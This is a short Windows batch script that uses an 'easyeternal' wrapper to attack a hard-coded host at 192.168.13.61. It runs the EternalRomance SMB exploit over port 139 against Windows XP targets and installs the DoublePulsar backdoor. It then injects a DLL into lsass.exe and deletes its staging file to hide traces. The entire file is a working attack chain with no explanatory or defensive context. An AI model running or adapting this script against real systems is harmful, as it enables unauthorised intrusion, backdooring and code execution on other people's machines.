@echo off
set %H=192.168.13.61
easyeternal unzip
easyeternal doublepulsar %H% 139 SMB x86 OutputInstall c:\1.bin
easyeternal eternalromance %H% 139 spoolss c:\1.bin Anonymous NBT XP_SP2SP3_X86
easyeternal doublepulsar %H% 139 SMB x86 RunDLL d:\datas\EasyEternalICMP.dll 1 lsass.exe "" 
easyeternal exit
del /f c:\1.bin